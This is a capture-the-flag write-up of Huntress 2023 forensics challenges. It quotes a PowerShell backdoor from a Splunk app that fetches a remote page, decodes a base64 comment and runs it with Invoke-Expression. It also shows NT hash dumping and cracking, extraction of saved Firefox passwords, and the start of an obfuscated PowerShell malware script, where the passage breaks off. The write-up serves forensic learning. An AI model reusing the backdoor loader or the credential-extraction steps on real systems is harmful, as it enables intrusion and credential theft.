---
title: "Writeups for Huntress 2023 Forensics challenges"
tags: [CTF, Computer forensics, Huntress 2023]
---

## Backdoored Splunk

### Description

> You've probably seen Splunk being used for good, but have you seen it used for evil?
>
> NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.

### Solution

The zip archive contains some data related to Splunk:

```
.
├── app.manifest
├── appserver
│   └── static
│       ├── appIcon.png
│       └── appLogo.png
├── bin
│   ├── Invoke-MonitoredScript.ps1
│   ├── log.py
│   ├── netsh_address.bat
│   ├── powershell
│   │   ├── 2012r2-health.ps1
│   │   ├── 2012r2-repl-stats.ps1
│   │   ├── 2012r2-siteinfo.ps1
│   │   ├── dns-health.ps1
│   │   ├── dns-zoneinfo.ps1
│   │   ├── generate_windows_update_logs.ps1
│   │   ├── nt6-health.ps1
│   │   ├── nt6-repl-stat.ps1
│   │   └── nt6-siteinfo.ps1
│   ├── runpowershell.cmd
│   ├── user_account_control_property.py
│   ├── win_installed_apps.bat
│   ├── win_listening_ports.bat
│   ├── win_timesync_configuration.bat
│   └── win_timesync_status.bat
├── default
│   ├── app.conf
│   ├── eventtypes.conf
│   ├── inputs.conf
│   ├── macros.conf
│   ├── props.conf
│   ├── tags.conf
│   ├── transforms.conf
│   ├── wmi.conf
│   └── workflow_actions.conf
├── LICENSES
│   └── LicenseRef-Splunk-8-2021.txt
├── lookups
│   ├── dns_recordclass_lookup.csv
│   ├── msad_group_type.csv
│   ├── msdhcp_signatures.csv
│   ├── object_category_850.csv
│   ├── status_850.csv
│   ├── user_types.csv
│   ├── vendor_actions.csv
│   ├── windows_actions.csv
│   ├── windows_apps.csv
│   ├── windows_audit_changes_860.csv
│   ├── windows_dns_action_lookup.csv
│   ├── windows_dns_query_type_lookup.csv
│   ├── windows_endpoint_port_transport.csv
│   ├── windows_endpoint_service_service_name.csv
│   ├── windows_endpoint_service_service_type.csv
│   ├── windows_eventtypes.csv
│   ├── windows_privileges.csv
│   ├── windows_severities.csv
│   ├── windows_signatures_860.csv
│   ├── windows_signatures_substatus_850.csv
│   ├── windows_start_mode_lookup.csv
│   ├── windows_timesync_actions.csv
│   ├── windows_update_statii.csv
│   ├── windows_wineventlog_change_action_860.csv
│   ├── windows_wineventlog_change_object_fields_860.csv
│   ├── wmi_user_account_status.csv
│   ├── wmi_version_range.csv
│   ├── xmlsecurity_change_audit_and_account_management_860.csv
│   ├── xmlsecurity_eventcode_action.csv
│   ├── xmlsecurity_eventcode_action_multiinput.csv
│   └── xmlsecurity_eventcode_errorcode_action.csv
├── metadata
│   └── default.meta
├── README
│   └── transforms.conf.spec
├── README.txt
├── splunkbase.manifest
├── static
│   ├── appIcon_2x.png
│   ├── appIconAlt_2x.png
│   ├── appIconAlt.png
│   ├── appIconLg_2x.png
│   ├── appIconLg.png
│   └── appIcon.png
├── THIRDPARTY
└── VERSION

10 directories, 74 files
```

Of course if there is a backdoor there are chances that it is in the `bin` folder.

In the file `bin/powershell/nt6-health.ps1` we can read those lines:

```powershell
#
# Windows Version and Build #
#
$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
# $PORT below is dynamic to the running service of the `Start` button
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})
```

It is doing a web request to a domain with an authentication header, extracting a comment from the HTML content, decoding at as base64 then execute it.

Let's use the `Start` button on the challenge page: it provides us a valid port for the `chal.ctf.games` domain.

Then let's send a request with the credentials to see what we get:

```bash
curl http://chal.ctf.games:31106/ -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==" -D-
```

We get the following HTML response:

```html
<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->
```

which decodes to:

```bash
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

## Bad Memory

### Description

> A user came to us and said they forgot their password. Can you recover it? The flag is the MD5 hash of the recovered password wrapped in the proper flag format.

### Solution

We have to download a 588M `image.zip` file. Once uncompressed we have a 4,5G `image.bin` file.

It doesn't have a known file header but looking at strings it may be a dump of a filesystem.

My first attempt was at using binwalk to find a FS in it:

```console
$ docker run -it --rm -v "$(pwd):/workspace" -w /workspace sheabot/binwalk -e image.bin
Unable to find image 'sheabot/binwalk:latest' locally
latest: Pulling from sheabot/binwalk
da7391352a9b: Pull complete
14428a6d4bcd: Pull complete
2c2d948710f2: Pull complete
d96aa108cf03: Pull complete
35ddc3df200f: Pull complete
aea14dd5cb16: Pull complete
1e670d9cddb3: Pull complete
9ba2470bcc7f: Pull complete
3d4751bc819f: Pull complete
84180c1b9f7f: Pull complete
7f9e11bbf4ad: Pull complete
Digest: sha256:f066ef908886c481a69b98eafb1638b21f46a4b1074acf1c7e7a5f36234b137a
Status: Downloaded newer image for sheabot/binwalk:latest

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
200853        0x31095         Certificate in DER format (x509 v3), header length: 4, sequence length: 1286
202143        0x3159F         Certificate in DER format (x509 v3), header length: 4, sequence length: 1495
204785        0x31FF1         Certificate in DER format (x509 v3), header length: 4, sequence length: 1269
206058        0x324EA         Certificate in DER format (x509 v3), header length: 4, sequence length: 1649
233014        0x38E36         Certificate in DER format (x509 v3), header length: 4, sequence length: 1286
234304        0x39340         Certificate in DER format (x509 v3), header length: 4, sequence length: 1495
236939        0x39D8B         Certificate in DER format (x509 v3), header length: 4, sequence length: 1265
238208        0x3A280         Certificate in DER format (x509 v3), header length: 4, sequence length: 1649
524592        0x80130         Certificate in DER format (x509 v3), header length: 4, sequence length: 961
536742        0x830A6         Certificate in DER format (x509 v3), header length: 4, sequence length: 6001
560638        0x88DFE         Certificate in DER format (x509 v3), header length: 4, sequence length: 673
562674        0x895F2         Certificate in DER format (x509 v3), header length: 4, sequence length: 10069
818867        0xC7EB3         Unix path: /home/vbox/vbox-6.1.10/out/debian/builddir/obj/VBoxVgaBios386/VBoxVgaBios386.sym
1421312       0x15B000        Microsoft executable, portable (PE)
1525668       0x1747A4        Certificate in DER format (x509 v3), header length: 4, sequence length: 5857
1544511       0x17913F        Certificate in DER format (x509 v3), header length: 4, sequence length: 15505
--- snip ---
6095070       0x5D00DE        Certificate in DER format (x509 v3), header length: 4, sequence length: 1256
6216775       0x5EDC47        Certificate in DER format (x509 v3), header length: 4, sequence length: 17880
6306096       0x603930        Certificate in DER format (x509 v3), header length: 4, sequence length: 887
6435624       0x623328        Ubiquiti firmware header, third party, ~CRC32: 0x0, version: "GL32"
```

Doesn't seem the expected way... So it must be a memory dump (hence the challenge name).

Let's get [Volatility](https://www.volatilityfoundation.org/) which is the most popular FOSS when it comes to memory forensics.

It can be a pain to use it for Linux forensics because there changes in kernels make it hard to use (as far as I experienced) but it is OK for Windows OS.

I found some tutorials on the web to extract Windows hashes using Volatility, but they weren't up-to-date.

```console
$ docker run -v $PWD:/workspace sk4la/volatility3 -f image.bin imageinfo
Volatility 3 Framework 2.0.1
usage: volatility [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]]
                  [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG]
                  [-o OUTPUT_DIR] [-q] [-r RENDERER] [-f FILE]
                  [--write-config] [--clear-cache] [--cache-path CACHE_PATH]
                  [--offline] [--single-location SINGLE_LOCATION]
                  [--stackers [STACKERS ...]]
                  [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]
                  plugin ...
volatility: error: argument plugin: invalid choice imageinfo (choose from banners.Banners, configwriter.ConfigWriter, frameworkinfo.FrameworkInfo, isfinfo.IsfInfo, layerwriter.LayerWriter, linux.bash.Bash, linux.check_afinfo.Check_afinfo, linux.check_creds.Check_creds, linux.check_idt.Check_idt, linux.check_modules.Check_modules, linux.check_syscall.Check_syscall, linux.elfs.Elfs, linux.keyboard_notifiers.Keyboard_notifiers, linux.kmsg.Kmsg, linux.lsmod.Lsmod, linux.lsof.Lsof, linux.malfind.Malfind, linux.proc.Maps, linux.pslist.PsList, linux.pstree.PsTree, linux.tty_check.tty_check, mac.bash.Bash, mac.check_syscall.Check_syscall, mac.check_sysctl.Check_sysctl, mac.check_trap_table.Check_trap_table, mac.ifconfig.Ifconfig, mac.kauth_listeners.Kauth_listeners, mac.kauth_scopes.Kauth_scopes, mac.kevents.Kevents, mac.list_files.List_Files, mac.lsmod.Lsmod, mac.lsof.Lsof, mac.malfind.Malfind, mac.mount.Mount, mac.netstat.Netstat, mac.proc_maps.Maps, mac.psaux.Psaux, mac.pslist.PsList, mac.pstree.PsTree, mac.socket_filters.Socket_filters, mac.timers.Timers, mac.trustedbsd.Trustedbsd, mac.vfsevents.VFSevents, timeliner.Timeliner, windows.bigpools.BigPools, windows.cachedump.Cachedump, windows.callbacks.Callbacks, windows.cmdline.CmdLine, windows.crashinfo.Crashinfo, windows.dlllist.DllList, windows.driverirp.DriverIrp, windows.driverscan.DriverScan, windows.dumpfiles.DumpFiles, windows.envars.Envars, windows.filescan.FileScan, windows.getservicesids.GetServiceSIDs, windows.getsids.GetSIDs, windows.handles.Handles, windows.hashdump.Hashdump, windows.info.Info, windows.lsadump.Lsadump, windows.malfind.Malfind, windows.memmap.Memmap, windows.modscan.ModScan, windows.modules.Modules, windows.mutantscan.MutantScan, windows.netscan.NetScan, windows.netstat.NetStat, windows.poolscanner.PoolScanner, windows.privileges.Privs, windows.pslist.PsList, windows.psscan.PsScan, windows.pstree.PsTree, windows.registry.certificates.Certificates, windows.registry.hivelist.HiveList, windows.registry.hivescan.HiveScan, windows.registry.printkey.PrintKey, windows.registry.userassist.UserAssist, windows.skeleton_key_check.Skeleton_Key_Check, windows.ssdt.SSDT, windows.statistics.Statistics, windows.strings.Strings, windows.svcscan.SvcScan, windows.symlinkscan.SymlinkScan, windows.vadinfo.VadInfo, windows.vadyarascan.VadYaraScan, windows.verinfo.VerInfo, windows.virtmap.VirtMap, yarascan.YaraScan)
```

So let's just use `windows.hashdump.Hashdump`:

```console
$ docker run -v $PWD:/workspace sk4la/volatility3 -f /workspace/image.bin windows.hashdump.Hashdump
Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished                                                                                              
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        4cff1380be22a7b2e12d22ac19e2cdc0
congo   1001    aad3b435b51404eeaad3b435b51404ee        ab395607d3779239b83eed9906b4fb92
```

[crackstation](https://crackstation.net/) is the online tool of choice to crack NT hashes.

The cleartext password for `congo` is `goldfish#`.

```console
$ echo -n "goldfish#" | md5sum 
2eb53da441962150ae7d3840444dfdde  -
```

So our flag is `flag{2eb53da441962150ae7d3840444dfdde}`.

We can go a little bit further by checking the OS version:

```console
$ docker run -v $PWD:/workspace sk4la/volatility3 -f /workspace/image.bin windows.info.Info
Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished                                                                                              
Variable        Value

Kernel Base     0xf8047e200000
DTB     0x1aa000
Symbols file:///usr/local/lib/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/81BC5C377C525081645F9958F209C527-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdVersionBlock  0xf8047ee0f2a8
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      1
SystemTime      2020-10-03 11:45:39
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Sun Aug 11 05:47:24 2069
```

## Dumpster Fire

### Description

> We found all this data in the dumpster! Can you find anything interesting in here,  like any cool passwords or anything? Check it out quick before the foxes get to it!

### Solution

This is an archive of a filesystem with a lot of files (for a challenge).

However, there is a user called `challenge` and it doesn't have much expect its `.mozilla` folder:

```console
$ ls home/challenge -al
total 24
drwxr-xr-x 3 nico nico 4096 nov.   7  2020 .
drwxr-xr-x 3 nico nico 4096 nov.   7  2020 ..
-rw-r--r-- 1 nico nico  220 nov.   7  2020 .bash_logout
-rw-r--r-- 1 nico nico 3771 nov.   7  2020 .bashrc
drwxrwxr-x 3 nico nico 4096 nov.   7  2020 .mozilla
-rw-r--r-- 1 nico nico  807 nov.   7  2020 .profile
```

Using [firefox_decrypt](https://github.com/devl00p/firefox_decrypt) it is possible to extract saved passwords from the Firefox profile.

```console
$ python3 firefox_decrypt/firefox_decrypt.py home/challenge/.mozilla/firefox/bc1m1zlr.default-release/
2023-10-09 15:45:52,284 - WARNING - profile.ini not found in home/challenge/.mozilla/firefox/bc1m1zlr.default-release/
2023-10-09 15:45:52,284 - WARNING - Continuing and assuming 'home/challenge/.mozilla/firefox/bc1m1zlr.default-release/' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Opposable Thumbs

### Description

> We uncovered a database. Perhaps the flag is right between your fingertips!

### Solution

The file doesn't seem to match anything:

```console
$ file thumbcache_256.db
thumbcache_256.db: data
```

However, scrolling the content with hexdump we can clearly see it constains some files like a PNG:

```
00000510  64 00 63 00 32 00 33 00  37 00 89 50 4e 47 0d 0a  |d.c.2.3.7..PNG..|
00000520  1a 0a 00 00 00 0d 49 48  44 52 00 00 01 00 00 00  |......IHDR......|
00000530  01 00 08 06 00 00 00 5c  72 a8 66 00 00 00 01 73  |.......\r.f....s|
00000540  52 47 42 00 ae ce 1c e9  00 00 00 04 67 41 4d 41  |RGB.........gAMA|
00000550  00 00 b1 8f 0b fc 61 05  00 00 5f b5 49 44 41 54  |......a..._.IDAT|
```

Let's carve some files out of that db file. My first idea was to use `binwalk` which is a reference when it comes to analyzing firmwares:

```console
$ docker run -it --rm -v "/tmp/output:/workspace" -w /workspace sheabot/binwalk -M -B -e /workspace/thumbcache_256.db
Scan Time:     2023-10-14 13:15:14
Target File:   /workspace/thumbcache_256.db
MD5 Checksum:  6bb1234e0539286351563b4aebc577d0
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1306          0x51A           PNG image, 256 x 256, 8-bit/color RGBA, non-interlaced
1376          0x560           Zlib compressed data, compressed
26084         0x65E4          PNG image, 256 x 256, 8-bit/color RGBA, non-interlaced
26154         0x662A          Zlib compressed data, compressed
37474         0x9262          PNG image, 256 x 256, 8-bit/color RGBA, non-interlaced
37544         0x92A8          Zlib compressed data, compressed
55356         0xD83C          PNG image, 256 x 256, 8-bit/color RGBA, non-interlaced
55426         0xD882          Zlib compressed data, compressed
80032         0x138A0         JPEG image data, JFIF standard 1.01


Scan Time:     2023-10-14 13:15:15
Target File:   /workspace/_thumbcache_256.db.extracted/560
MD5 Checksum:  a7d60d15c626680ff66ad97255b26f4b
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2023-10-14 13:15:15
Target File:   /workspace/_thumbcache_256.db.extracted/662A
MD5 Checksum:  840b3160525010ae9515a5915233236b
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2023-10-14 13:15:15
Target File:   /workspace/_thumbcache_256.db.extracted/92A8
MD5 Checksum:  48940844300226858a35f90f9d3dcaef
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2023-10-14 13:15:15
Target File:   /workspace/_thumbcache_256.db.extracted/D882
MD5 Checksum:  a7d60d15c626680ff66ad97255b26f4b
Signatures:    391

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

Disappointing: binwalk actually see the files but did not extract everything.

Instead of going deeper into this issue I chose to use an older tool called `foremost` which works great for files recovery (`PhotoRec` is another solution).

```console
$ foremost -o yolo thumbcache_256.db
Processing: thumbcache_256.db
|*|
$ tree yolo
yolo
├── audit.txt
├── jpg
│   └── 00000156.jpg
└── png
    ├── 00000002.png
    ├── 00000050.png
    ├── 00000073.png
    └── 00000108.png

2 directories, 6 files
```

The JPG file contains the flag:

![Flag in carved JPG file](/assets/img/Huntress2023/OpposableThumbs.jpg)

## Rogue Inbox

### Description

> You've been asked to audit the Microsoft 365 activity for a recently onboarded as a customer of your MSP.
>
> Your new customer is afraid that Debra was compromised. We received logs exported from Purview... can you figure out what the threat actor did? It might take some clever log-fu!

### Solution

You get a CSV file which looks like that:

```cvs
RecordId,CreationDate,RecordType,Operation,UserId,AuditData,AssociatedAdminUnits,AssociatedAdminUnitsNames
538815b7-273a-4a3f-9957-c86897966eec,9/20/2023 4:05:03 AM,8,Add service principal.,Certificate,"{""CreationTime"":""2023-09-20T04:05:03"",""Id"":""538815b7-273a-4a3f-9957-c86897966eec"",""Operation"":""Add service principal."",""OrganizationId"":""df233d94-fed3-4436-bf9a-a799fb85a159"",""RecordType"":8,""ResultStatus"":""Success"",""UserKey"":""Not Available"",""UserType"":4,""Version"":1,""Workload"":""AzureActiveDirectory"",""ObjectId"":""66244124-575c-4284-92bc-fdd00e669cea"",""UserId"":""Certificate"",""AzureActiveDirectoryEventType"":1,""ExtendedProperties"":[{""Name"":""additionalDetails"",""Value"":""{\""AppId\"":\""66244124-575c-4284-92bc-fdd00e669cea\""}""},{""Name"":""extendedAuditEventCategory"",""Value"":""ServicePrincipal""}],""ModifiedProperties"":[{""Name"":""AccountEnabled"",""NewValue"":""[\r\n  true\r\n]"",""OldValue"":""[]""},{""Name"":""AppAddress"",""NewValue"":""[\r\n  {\r\n    \""AddressType\"": 0,\r\n    \""Address\"": \""https:\/\/iamtenantcrawler.microsoft.com\"",\r\n    \""ReplyAddressClientType\"": 1,\r\n    \""ReplyAddressIndex\"": null,\r\n    \""IsReplyAddressDefault\"": false\r\n  },\r\n  {\r\n    \""AddressType\"": 4,\r\n    \""Address\"": \""https:\/\/iamtenantcrawler.microsoft.com\/reply\"",\r\n    \""ReplyAddressClientType\"": 0,\r\n    \""ReplyAddressIndex\"": null,\r\n    \""IsReplyAddressDefault\"": false\r\n  }\r\n]"",""OldValue"":""[]""},{""Name"":""AppPrincipalId"",""NewValue"":""[\r\n  \""66244124-575c-4284-92bc-fdd00e669cea\""\r\n]"",""OldValue"":""[]""},{""Name"":""DisplayName"",""NewValue"":""[\r\n  \""IAMTenantCrawler\""\r\n]"",""OldValue"":""[]""},{""Name"":""ServicePrincipalName"",""NewValue"":""[\r\n  \""66244124-575c-4284-92bc-fdd00e669cea\""\r\n]"",""OldValue"":""[]""},{""Name"":""Credential"",""NewValue"":""[\r\n  {\r\n    \""CredentialType\"": 2,\r\n    \""KeyStoreId\"": \""291154f0-a9f5-45bb-87be-9c8ee5b6d62c\"",\r\n    \""KeyGroupId\"": \""1b688382-21fe-4a45-af46-11c18288f363\""\r\n  }\r\n]"",""OldValue"":""[]""},{""Name"":""Included Updated Properties"",""NewValue"":""AccountEnabled, AppAddress, AppPrincipalId, DisplayName, ServicePrincipalName, Credential"",""OldValue"":""""},{""Name"":""TargetId.ServicePrincipalNames"",""NewValue"":""66244124-575c-4284-92bc-fdd00e669cea"",""OldValue"":""""}],""Actor"":[{""ID"":""Microsoft Azure AD Internal - Jit Provisioning"",""Type"":1},{""ID"":""Certificate"",""Type"":2},{""ID"":""Other"",""Type"":2}],""ActorContextId"":""df233d94-fed3-4436-bf9a-a799fb85a159"",""InterSystemsId"":""a76a8e12-a838-4350-bce2-3c1a7196670b"",""IntraSystemId"":""602f9fdd-4b8f-4734-a2ca-727fac72358e"",""SupportTicketId"":"""",""Target"":[{""ID"":""ServicePrincipal_691e82fd-babf-451c-8a3d-826f69957567"",""Type"":2},{""ID"":""691e82fd-babf-451c-8a3d-826f69957567"",""Type"":2},{""ID"":""ServicePrincipal"",""Type"":2},{""ID"":""IAMTenantCrawler"",""Type"":1},{""ID"":""66244124-575c-4284-92bc-fdd00e669cea"",""Type"":2},{""ID"":""66244124-575c-4284-92bc-fdd00e669cea"",""Type"":4}],""TargetContextId"":""df233d94-fed3-4436-bf9a-a799fb85a159""}",,
adba4658-fe8e-495a-bfb5-edb4ad398956,9/21/2023 7:34:07 AM,8,Add service principal.,Certificate,"{""CreationTime"":""2023-09-21T07:34:07"",""Id"":""adba4658-fe8e-495a-bfb5-edb4ad398956"",""Operation"":""Add service principal."",""OrganizationId"":""df233d94-fed3-4436-bf9a-a799fb85a159"",""RecordType"":8,""ResultStatus"":""Success"",""UserKey"":""Not Available"",""UserType"":4,""Version"":1,""Workload"":""AzureActiveDirectory"",""ObjectId"":""d7097cd1-c779-44d0-8c71-ab1f8386a97e"",""UserId"":""Certificate"",""AzureActiveDirectoryEventType"":1,""ExtendedProperties"":[{""Name"":""additionalDetails"",""Value"":""{\""AppId\"":\""d7097cd1-c779-44d0-8c71-ab1f8386a97e\""}""},{""Name"":""extendedAuditEventCategory"",""Value"":""ServicePrincipal""}],""ModifiedProperties"":[{""Name"":""AccountEnabled"",""NewValue"":""[\r\n  true\r\n]"",""OldValue"":""[]""},{""Name"":""AppPrincipalId"",""NewValue"":""[\r\n  \""d7097cd1-c779-44d0-8c71-ab1f8386a97e\""\r\n]"",""OldValue"":""[]""},{""Name"":""DisplayName"",""NewValue"":""[\r\n  \""Microsoft Office Licensing Service Agents\""\r\n]"",""OldValue"":""[]""},{""Name"":""ServicePrincipalName"",""NewValue"":""[\r\n  \""d7097cd1-c779-44d0-8c71-ab1f8386a97e\""\r\n]"",""OldValue"":""[]""},{""Name"":""Credential"",""NewValue"":""[\r\n  {\r\n    \""CredentialType\"": 2,\r\n    \""KeyStoreId\"": \""291154f0-a9f5-45bb-87be-9c8ee5b6d62c\"",\r\n    \""KeyGroupId\"": \""b3893f71-2721-4260-bfe1-df8021720b61\""\r\n  }\r\n]"",""OldValue"":""[]""},{""Name"":""Included Updated Properties"",""NewValue"":""AccountEnabled, AppPrincipalId, DisplayName, ServicePrincipalName, Credential"",""OldValue"":""""},{""Name"":""TargetId.ServicePrincipalNames"",""NewValue"":""d7097cd1-c779-44d0-8c71-ab1f8386a97e"",""OldValue"":""""}],""Actor"":[{""ID"":""Microsoft Azure AD Internal - Jit Provisioning"",""Type"":1},{""ID"":""Certificate"",""Type"":2},{""ID"":""Other"",""Type"":2}],""ActorContextId"":""df233d94-fed3-4436-bf9a-a799fb85a159"",""InterSystemsId"":""b8e67b42-963b-44de-a0f0-4cd952995af1"",""IntraSystemId"":""e2816224-e9c3-45b7-8238-1501690b7b21"",""SupportTicketId"":"""",""Target"":[{""ID"":""ServicePrincipal_0d3e6e97-2328-4e47-8265-b21569e6413c"",""Type"":2},{""ID"":""0d3e6e97-2328-4e47-8265-b21569e6413c"",""Type"":2},{""ID"":""ServicePrincipal"",""Type"":2},{""ID"":""Microsoft Office Licensing Service Agents"",""Type"":1},{""ID"":""d7097cd1-c779-44d0-8c71-ab1f8386a97e"",""Type"":2},{""ID"":""d7097cd1-c779-44d0-8c71-ab1f8386a97e"",""Type"":4}],""TargetContextId"":""df233d94-fed3-4436-bf9a-a799fb85a159""}",,
```

Basically those are some event logs and details of the actions are stored using JSON format.

With a `grep` on `flag` I can notice entries like this one:

```json
""Parameters"":[{""Name"":""AlwaysDeleteOutlookRulesBlob"",""Value"":""False""},{""Name"":""Force"",""Value"":""False""},{""Name"":""From"",""Value"":""flag@ctf.com""},{""Name"":""MoveToFolder"",""Value"":""Conversation History""},{""Name"":""Name"",""Value"":""6""},{""Name"":""MarkAsRead"",""Value"":""True""},{""Name"":""StopProcessingRules"",""Value"":""True""}]
```

Notice the dictionary where the key is named `Name` and the values is a single character... There are multiple instances in the file.

Let's extract those:

```python
import sys
import json

with open("json.json") as fd:
    for line in fd:
        if "flag@ctf.com" in line:
            line = line.strip()
            data = json.loads(line)
            for parameter in data["Parameters"]:
                if parameter["Name"] == "Name":
                    sys.stdout.write((parameter["Value"]))
print()
```

And voilà: `flag{24c4230fa7d50eef392b2c850f74b0f6}`

## Texas Chainsaw Massacre: Tokyo Drift

### Description

> Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log.
>
> The EVTX file is attached. Are you able to find anything malicious?

### Solution

We are given a Windows Event file:

```console
$ file Application\ Logs.evtx
Application Logs.evtx: MS Windows Vista Event Log, 3 chunks (no. 2 in use), next record no. 268
```

We can get some tools to extract information using the package manager:

```bash
sudo apt-get install libevtx-utils
```

Using `evtxexport` will output each even on the standard output:

```console
$ evtxexport Application\ Logs.evtx 
evtxexport 20181227

Event number                    : 1
Written time                    : Oct 10, 2023 15:54:18.664185000 UTC
Event level                     : Information (4)
Computer name                   : DESKTOP-JU2PNRI
Source name                     : Microsoft-Windows-CAPI2
Event identifier                : 0x00001001 (4097)
Number of strings               : 2
String: 1                       : CN=GlobalSign Root CA, OU=Root CA, O=GlobalSign nv-sa, C=BE
String: 2                       : B1BC968BD4F49D622AA89A81F2150152A41D829C

Event number                    : 2
Written time                    : Oct 10, 2023 15:54:21.410805100 UTC
Event level                     : Information (4)
Computer name                   : DESKTOP-JU2PNRI
Source name                     : Microsoft-Windows-CAPI2
Event identifier                : 0x00001001 (4097)
Number of strings               : 2
String: 1                       : OU=Starfield Class 2 Certification Authority, O="Starfield Technologies, Inc.", C=US
String: 2                       : AD7E1C28B064EF8F6003402014C3D0E3370EB58A

Event number                    : 3
Written time                    : Oct 10, 2023 15:54:22.143524300 UTC
Event level                     : Information (4)
Computer name                   : DESKTOP-JU2PNRI
Source name                     : Microsoft-Windows-CAPI2
Event identifier                : 0x00001001 (4097)
Number of strings               : 2
String: 1                       : CN=VeriSign Universal Root Certification Authority, OU="(c) 2008 VeriSign, Inc. - For authorized use only", OU=VeriSign Trust Network, O="VeriSign, Inc.", C=US
String: 2                       : 3679CA35668772304D30A5FB873B0FA77BB70D54
--- snip ---
```

We can see that the real content is hex-encoded.

Let's redirect the output to a txt file and write a Python script to decode everything in hexadecimal:

```python
import re
import binascii

text = open("events.txt").read()

hex_pattern = r'\b[0-9a-fA-F]+\b'

hex_matches = re.findall(hex_pattern, text)

for hex_string in hex_matches:
    try:
        decoded_text = binascii.unhexlify(hex_string).decode('utf-8', errors="ignore")
        print(decoded_text)
    except binascii.Error:
        pass
```

Out of all the information there is a big obfuscated Powershell script:

```powershell
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) 